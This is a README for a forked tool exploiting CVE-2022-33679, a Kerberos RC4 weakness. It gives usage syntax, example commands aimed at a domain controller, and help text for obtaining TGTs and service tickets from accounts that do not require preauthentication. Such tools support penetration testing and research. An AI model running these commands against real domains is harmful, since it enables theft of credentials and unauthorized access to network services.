# CVE-2022-33679
One day based on https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html

Forked from https://github.com/Bdenneu/CVE-2022-33679. Added service selection.

## Usage

```bash
CVE-AS-REP.py request_user service target serverName [-h] [-ts] [-debug] [-dc-ip ip address] 
```
```bash
CVE-AS-REP.py domain.local/asrep_user1 ldap 'DC01' -dc-ip 10.0.0.1
```
```bash
CVE-AS-REP.py domain.local/asrep_user2 cifs 'DC01.DOMAIN.LOCAL' -dc-ip 10.0.0.1
```
## Example

![Alt text](images/example.png "Example")

## Help
```b1
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

usage: CVE-AS-REP.py [-h] [-ts] [-debug] [-dc-ip ip address] target service serverName

Retrieve a TGT for a user having'Do not require Kerberos preauthentication' set and export their TGS of the given server

positional arguments:
  target             domain/username
  service            target service
  serverName         server name

options:
  -h, --help         show this help message and exit
  -ts                Adds timestamp to every logging output
  -debug             Turn DEBUG output ON

authentication:
  -dc-ip ip address  IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter
```
